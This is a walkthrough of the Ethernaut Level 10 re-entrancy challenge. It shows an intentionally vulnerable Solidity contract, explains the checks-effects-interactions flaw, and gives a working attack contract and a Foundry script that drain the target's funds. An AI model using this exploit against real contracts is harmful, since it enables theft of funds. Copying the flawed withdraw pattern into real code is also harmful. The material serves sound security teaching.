# Ethernaut Level 10 Re-entrancy

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

Our goal is to steal all the money from the target contract. We can see that in the `withdraw(uint256 _amount)` function, this contract does not follow the CEI (check-effect-interact) pattern, making an interaction **before** the state change. 

The receiver of the funds can be another contract instead of just plain address. The receiver can exploit your contract by calling your `withdraw` function *inside* its `receive()` logic. Since the line `balances[msg.sender] -= _amount;` is still not hit, the `withdraw` function will get called again and again until the balance of the contract drains. We can create an attack contract exactly like this.

`ReentranceAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance reentrance;
    uint256 donationAmount;

    constructor(address _reentranceAddress) public payable{
        reentrance = IReentrance(_reentranceAddress);
        donationAmount = msg.value;
    }

    function attack() external {
        reentrance.donate{value: donationAmount}(address(this));
        reentrance.withdraw(donationAmount);
    }

    receive() external payable {
        uint256 reentranceBalance = address(reentrance).balance;
        if (reentranceBalance >= donationAmount) {
            reentrance.withdraw(donationAmount);
        } else if (reentranceBalance > 0) {
            reentrance.withdraw(reentranceBalance);
        }
    }
}
```

In the `attack()` function, we first donate a certain amount of money to enter the transaction logic of the target, and then call `withdraw` to initiate the attack. Inside `receive()` function we create a mirror-like reflection logic to reenter the transaction. 

`Reentrance.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Script, console} from "forge-std/Script.sol";
import {Reentrance} from "../src/Reentrance.sol";
import {ReentranceAttack} from "../src/ReentranceAttack.sol";

contract ReentranceScript is Script {
    Reentrance reentrance = Reentrance(0xXXXXXXXXXXXXXX);
    uint256 donationAmount = 0.001 ether;

    function run() external {
        console.log("Reentrance balance before attack:", address(reentrance).balance);
        vm.startBroadcast();
        ReentranceAttack attackContract = new ReentranceAttack{value: donationAmount}(address(reentrance));
        attackContract.attack();
        vm.stopBroadcast();
        console.log("Reentrance balance after attack:", address(reentrance).balance);
    }
}
```

